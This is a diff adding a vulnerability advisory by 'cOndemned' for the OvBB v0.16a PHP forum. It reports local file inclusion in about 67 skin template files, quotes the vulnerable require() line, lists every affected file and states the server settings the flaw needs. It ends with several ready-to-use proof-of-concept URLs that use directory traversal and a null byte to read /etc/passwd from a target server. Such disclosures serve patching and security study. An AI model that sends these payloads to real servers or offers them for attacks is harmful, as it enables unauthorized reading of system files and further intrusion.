@@ -1,0 +1,105 @@
+OvBB v0.16a Multiple Local File Inclusion Vulnerabilities
+Found by cOndemned
+Tested on Linux Debian (apache + php5 + mysql)
+(download at http://sourceforge.net/projects/ovbb/)
+
+
+source of /skins/default/addevent.tpl.php
+
+	1.	<?php
+	2.		// Header.
+	3.		$strPageTitle = " :: Calendar :. New{$strType} Event";
+	4.		require("./skins/{$CFG['skin']}/header.tpl.php");		// LFI
+
+
+description:
+
+	register_globals must be turned on and magic quotes gpc must be turned
+	off in order to exploit thoes vulnerabilities.
+
+	thing looks the same in ALMOST all files in /skins/default directory.
+	(there is about 67 vulnerable files) 
+
+	prior versions may also be affected.
+
+
+list of vulnerable files:
+
+	/skins/default/addevent.tpl.php
+	/skins/default/alreadyregistered.tpl.php
+	/skins/default/calendar.tpl.php
+	/skins/default/deleteposts.tpl.php
+	/skins/default/deletethread.tpl.php
+	/skins/default/editevent.tpl.php
+	/skins/default/editpost.tpl.php
+	/skins/default/forgotdetails.tpl.php
+	/skins/default/getip.tpl.php
+	/skins/default/index.tpl.php
+	/skins/default/justregistered.tpl.php
+	/skins/default/login.tpl.php
+	/skins/default/mailuser.tpl.php
+	/skins/default/memberlist.tpl.php
+	/skins/default/movecopythread.tpl.php
+	/skins/default/newpoll.tpl.php
+	/skins/default/online.tpl.php
+	/skins/default/pollresults.tpl.php
+	/skins/default/post.tpl.php
+	/skins/default/register.tpl.php
+	/skins/default/sysmessage.tpl.php
+	/skins/default/unauthorized.tpl.php
+	/skins/default/admincp/addattachment.tpl.php
+	/skins/default/admincp/addavatar.tpl.php
+	/skins/default/admincp/addforum.tpl.php
+	/skins/default/admincp/addposticon.tpl.php
+	/skins/default/admincp/addskin.tpl.php
+	/skins/default/admincp/addsmilie.tpl.php
+	/skins/default/admincp/addusergroup.tpl.php
+	/skins/default/admincp/addusergroupuser.tpl.php
+	/skins/default/admincp/attachments.tpl.php
+	/skins/default/admincp/avatars.tpl.php
+	/skins/default/admincp/censored.tpl.php
+	/skins/default/admincp/editattachment.tpl.php
+	/skins/default/admincp/editavatar.tpl.php
+	/skins/default/admincp/editforum.tpl.php
+	/skins/default/admincp/editposticon.tpl.php
+	/skins/default/admincp/editskin.tpl.php
+	/skins/default/admincp/editsmilie.tpl.php
+	/skins/default/admincp/editusergroup.tpl.php
+	/skins/default/admincp/forums.tpl.php
+	/skins/default/admincp/general.tpl.php
+	/skins/default/admincp/posticons.tpl.php
+	/skins/default/admincp/removeattachment.tpl.php
+	/skins/default/admincp/removeavatar.tpl.php
+	/skins/default/admincp/removeforum.tpl.php
+	/skins/default/admincp/removeposticon.tpl.php
+	/skins/default/admincp/removeskin.tpl.php
+	/skins/default/admincp/removesmilie.tpl.php
+	/skins/default/admincp/removeusergroup.tpl.php
+	/skins/default/admincp/skins.tpl.php
+	/skins/default/admincp/smilies.tpl.php
+	/skins/default/admincp/style.tpl.php
+	/skins/default/admincp/usergroups.tpl.php
+	/skins/default/pm/folders.tpl.php
+	/skins/default/pm/inbox.tpl.php
+	/skins/default/pm/newmessage.tpl.php
+	/skins/default/pm/sentitems.tpl.php
+	/skins/default/pm/tracking.tpl.php
+	/skins/default/search/main.tpl.php
+	/skins/default/usercp/avatar.tpl.php
+	/skins/default/usercp/buddylist.tpl.php
+	/skins/default/usercp/ignorelist.tpl.php
+	/skins/default/usercp/main.tpl.php
+	/skins/default/usercp/options.tpl.php
+	/skins/default/usercp/password.tpl.php
+	/skins/default/usercp/profile.tpl.php
+
+
+proof of concept:
+
+	http://[target]/[OvBB_path]/skins/default/addevent.tpl.php?CFG[skin]=../../../../../../../../../etc/passwd%00
+	http://[target]/[OvBB_path]/skins/default/alreadyregistered.tpl.php?CFG[skin]=../../../../../../../../../etc/passwd%00
+	http://[target]/[OvBB_path]/skins/default/calendar.tpl.php?CFG[skin]=../../../../../../../../../etc/passwd%00
+	http://[target]/[OvBB_path]/skins/default/deleteposts.tpl.php?CFG[skin]=../../../../../../../../../etc/passwd%00
+	http://[target]/[OvBB_path]/skins/default/deletethread.tpl.php?CFG[skin]=../../../../../../../../../etc/passwd%00
+
+	etc...
